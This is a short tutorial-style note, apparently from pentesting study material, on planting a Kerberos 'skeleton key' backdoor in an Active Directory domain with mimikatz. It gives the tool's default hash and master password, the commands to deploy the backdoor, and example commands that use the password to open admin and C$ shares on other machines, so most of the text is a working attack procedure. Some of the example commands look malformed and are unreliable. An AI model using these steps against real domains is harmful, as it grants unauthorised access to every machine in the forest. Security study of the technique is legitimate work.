# Skeleton backdoor

Unlike the golden and silver ticket attacks a **Kerberos backdoor** is much more subtle because it acts **similar to a rootkit** by implanting itself into the memory of the domain forest allowing itself access to any of the machines with a master password.  

The Kerberos backdoor works by implanting a skeleton key that abuses the way that the AS-REQ validates encrypted timestamps.  

**A skeleton key only works using Kerberos RC4 encryption.**  
The default hash for a mimikatz skeleton key is `60BA4FCADC466C7A033C178194C03DF6` which is the password `mimikatz`

```cmd
mimikatz.exe
privilege::debug
```

As always, check if you have admin permissions
```cmd
misc::skeleton
```

### Accessing the forest
The default credentials will be: `mimikatz`

**example:** 
```cmd
net use c:\\DOMAIN-CONTROLLER\admin$ /user:Administrator mimikatz
```
- The share will now be accessible without the need for the Administrators password

**example:** 
```cmd
dir \\Desktop-1\c$ /user:Machine1 mimikatz 
```

- access the directory of `Desktop-1` without even knowing what users have access to `Desktop-1`

The skeleton key will not persist by itself because it runs in the memory, it can be scripted or persisted using other tools and techniques.